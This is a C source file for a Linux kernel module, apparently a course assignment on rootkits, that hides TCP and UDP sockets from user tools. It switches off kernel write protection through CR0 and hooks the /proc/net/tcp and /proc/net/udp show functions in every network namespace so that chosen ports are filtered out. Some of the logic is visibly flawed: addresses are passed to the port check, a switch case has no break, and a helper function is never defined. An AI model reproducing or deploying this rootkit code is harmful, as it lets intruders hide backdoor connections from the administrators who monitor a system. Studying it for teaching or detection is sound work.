/*
 *  Assignment 6
 *  Socket Hiding
 *
 *  Requirements:
 *     a) Hide sockets from user land tools
 */


#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/unistd.h>
#include <linux/mm_types.h>
#include <linux/types.h>
#include <asm/uaccess.h>
#include <linux/dirent.h>
#include <linux/sched.h>
#include <linux/proc_fs.h>
#include <linux/namei.h>
#include <linux/seq_file.h>
#include <linux/inet_diag.h>
#include <linux/profile.h>
#include <net/tcp.h>
#include <net/udp.h>
#include <net/inet_sock.h>

#include "sysmap.h"
#include "proc_internal.h"

#define MAX_HIDE_PORTS 99
#define SOCKET_STATE_VISIBLE 0
#define SOCKET_STATE_HIDDEN 1
#define syscalls ((void**)SM_sys_call_table)

void disable_ro(void)
{
    write_cr0(read_cr0() & ~X86_CR0_WP);
    barrier();
}

void enable_ro(void)
{
    write_cr0(read_cr0() | X86_CR0_WP);
    barrier();
}


int (*real_tcp4_seq_show)(struct seq_file*, void*);
int (*real_udp4_seq_show)(struct seq_file*, void*);
int (*real_packet_rcv)( struct sk_buff*,
                        struct net_device*,
                        struct packet_type*,
                        struct net_device* );
asmlinkage long (*real_sys_recvmsg)(int, struct msghdr*, unsigned) = (void*) SM_sys_recvmsg;
void** tcp_hook_fn_ptr;
void** udp_hook_fn_ptr;

inline int hide_tcp_port(short port)
{
    return should_hide(IPPROTO_TCP, ntohs(port));
}

inline int hide_udp_port(short port)
{
    return should_hide(IPPROTO_UDP, ntohs(port));
}

/*
 * Hooked show function of the TCP seq file
 */
int fake_tcp4_seq_show(struct seq_file *seq, void *v)
{
    struct tcp_iter_state* st;
    struct inet_sock* isk;
    struct inet_request_sock* ireq;
    /* struct inet_timewait_sock* itw; */

    if (v == SEQ_START_TOKEN) {
        return real_tcp4_seq_show(seq, v);
    }

    st = seq->private;

    switch (st->state) {
        case TCP_SEQ_STATE_LISTENING:
        case TCP_SEQ_STATE_ESTABLISHED:
            isk = inet_sk(v);
            if (hide_tcp_port(isk->inet_sport) || hide_tcp_port(isk->inet_dport)) {
                return 0;
            }
            break;
        case TCP_SEQ_STATE_OPENREQ:
            ireq = inet_rsk(v);
            if (hide_tcp_port(ireq->ir_loc_addr) || hide_tcp_port(ireq->ir_rmt_addr)) {
                return 0;
            }
        default:
            break;
    }
    return real_tcp4_seq_show(seq, v);
}

/*
 * Hooked show function of the UDP seq file
 */
int fake_udp4_seq_show(struct seq_file *seq, void *v)
{
    struct inet_sock* isk;

    if (v == SEQ_START_TOKEN) {
        return real_udp4_seq_show(seq, v);
    }

    isk = inet_sk(v);
    if (hide_udp_port(isk->inet_sport) || hide_udp_port(isk->inet_dport)) {
        return 0;
    }
    return real_udp4_seq_show(seq, v);
}

struct proc_dir_entry* get_pde_subdir(struct proc_dir_entry* pde, const char* name)
{
        struct rb_root *root = &pde->subdir;
        struct rb_node **new = &root->rb_node, *parent = NULL;

        /* Figure out where to put new node */
        while (*new) {
                struct proc_dir_entry *this =
                        container_of(*new, struct proc_dir_entry, subdir_node);
                int result; // proc_match(de->namelen, de->name, this);
if (strlen(name) < this->namelen) result = -1;
else if (strlen(name) > this->namelen) result = 1;
else result = memcmp(name, this->name, this->namelen);

                parent = *new;
                if (result < 0)
                        new = &(*new)->rb_left;
                else if (result > 0)
                        new = &(*new)->rb_right;
                else
                        return this;
        }

printk(KERN_INFO "thing not found BUGBUGBUG\n");
return NULL;
/*

    struct proc_dir_entry* ret = rb_entry(pde->subdir.rb_node, struct proc_dir_entry, subdir_node);
    while(ret && strcmp(name, ret->name)) {
        ret = ret->next;
    }
    return ret;*/
}

static int init_procstuff(void){
    struct net *net_ns;

    // Iterate all net namespaces
    list_for_each_entry(net_ns, ((typeof(&net_namespace_list))SM_net_namespace_list), list) {

        // Get the corresponding proc entries
        struct proc_dir_entry* pde_net = net_ns->proc_net;
        struct proc_dir_entry* pde_tcp = get_pde_subdir(pde_net, "tcp");
        struct proc_dir_entry* pde_udp = get_pde_subdir(pde_net, "udp");
        struct tcp_seq_afinfo* tcp_info = pde_tcp->data;
        struct udp_seq_afinfo* udp_info = pde_udp->data;

        // Save and hook the TCP show function
        tcp_hook_fn_ptr = (void**) &tcp_info->seq_ops.show;
        real_tcp4_seq_show = *tcp_hook_fn_ptr;
        *tcp_hook_fn_ptr = fake_tcp4_seq_show;

        // Save and hook the UDP show function
        udp_hook_fn_ptr = (void**) &udp_info->seq_ops.show;
        real_udp4_seq_show = *udp_hook_fn_ptr;
        *udp_hook_fn_ptr = fake_udp4_seq_show;
    }

    return 0;
}

static void cleanup_procstuff(void){
    // Restore the hooked funtions
    *tcp_hook_fn_ptr = real_tcp4_seq_show;
    *udp_hook_fn_ptr = real_udp4_seq_show;
}

